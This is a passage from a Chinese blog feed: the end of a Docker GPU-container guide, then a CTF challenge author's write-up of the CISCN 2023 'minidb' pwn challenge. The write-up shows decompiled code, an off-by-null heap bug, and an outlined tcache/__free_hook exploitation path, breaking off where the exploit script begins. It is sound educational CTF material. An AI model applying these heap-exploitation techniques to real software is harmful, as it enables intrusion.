NVIDIA_VISIBLE_DEVICES=显卡标号</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，挂载多张显卡需要用 <code>,</code> 进行隔离（<strong>显卡标号间不要加空格</strong> ），这里以挂载第一、二张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=0,1 自定义镜像名</span><br></code></pre></td></tr></table></figure><h3 id="传统用法"><a href="#传统用法" class="headerlink" title="传统用法"></a>传统用法</h3><ul><li>容器内挂载所有的显卡</li></ul><p>额外添加 <code>--gpus all</code> 参数即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--gpus=&#39;&quot;device=显卡标号&quot;&#39;</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，以下命令以第一张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;怎么实验室只有👴一个运维&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x09】CISCN 2023 华东北分区赛 minidb、kkk 出题手记</title>
    <link href="https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/"/>
    <id>https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</id>
    <published>2023-07-13T23:43:35.000Z</published>
    <updated>2023-12-17T19:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>典中典之低质量套路 Pwn 题集合</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>第一次帮国赛出题（<del>主要是听说有💴恰</del>），不出意外的话应该也是本科阶段最后一次出 CTF Pwn 题目了，同时这也是笔者第一次出 AWDP 的题目，感觉还是有点意思的 ：）</p><p>因为短时间内确实是想不出什么新东西了所以出了两道比较套路化的题目，可惜解题率似乎有点不尽人意，估计大佬们应该都不屑于做笔者出的烂题吧 :（</p><h1 id="0x01-minidb（简单）"><a href="#0x01-minidb（简单）" class="headerlink" title="0x01. minidb（简单）"></a>0x01. minidb（简单）</h1><p>这道题出题时的难度设置便是 <code>简单</code> ，所以笔者是按照签到题的难度去出的，不过虽然成功 <code>fix</code> 的队伍不少，但是成功 <code>break</code> 的队伍似乎并如预期不多🤔（<del>修都修了打还不会打🐎，你们是不是偷偷藏了什么👴不知道的通防手段</del>）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先还是惯例修个跳表：</p><p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" alt="IDA 修复跳表.png"></p><p>提供了两层堆菜单，第一层可以让用户创建、使用、删除、展示、重命名数据库：</p><p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中数据库的创建会分配两个 chunk，一个用作数据库本体，另一个用作数据库的名字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二层堆菜单则提供了对数据库内键值对数据的增加、查询、更新、删除操作：</p><p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中判断是否存在重复键的逻辑如下，可以看出数据储存方式是哈希表 + 单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>由此我们可以逆向出数据库与键值对的结构体定义分别如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞点在于编辑键值对的功能中，这里在读取用户输入后会先在键值对末尾放置 <code>&#39;\0&#39;</code> 后再检查长度，虽然限制了最大输入长度为 255 字符，但键值对的值长度有 <code>128</code> 和 <code>256</code> 两种类型，<strong>对于前者而言我们可以利用该漏洞完成一个堆上越界写 \0</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于是签到题难度所以解法比较俗，简单风水一下利用越界写改一个数据库的 <code>database-&gt;name</code> 指向另一个 chunk，释放进 unsorted bin 利用 UAF read 泄露 libc 后重取释放回 tcache 后劫持 next 指针打 <code>__free_hook</code> 即可</p><blockquote><p>感觉也没啥好说的，毕竟本来就是签到题难度（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 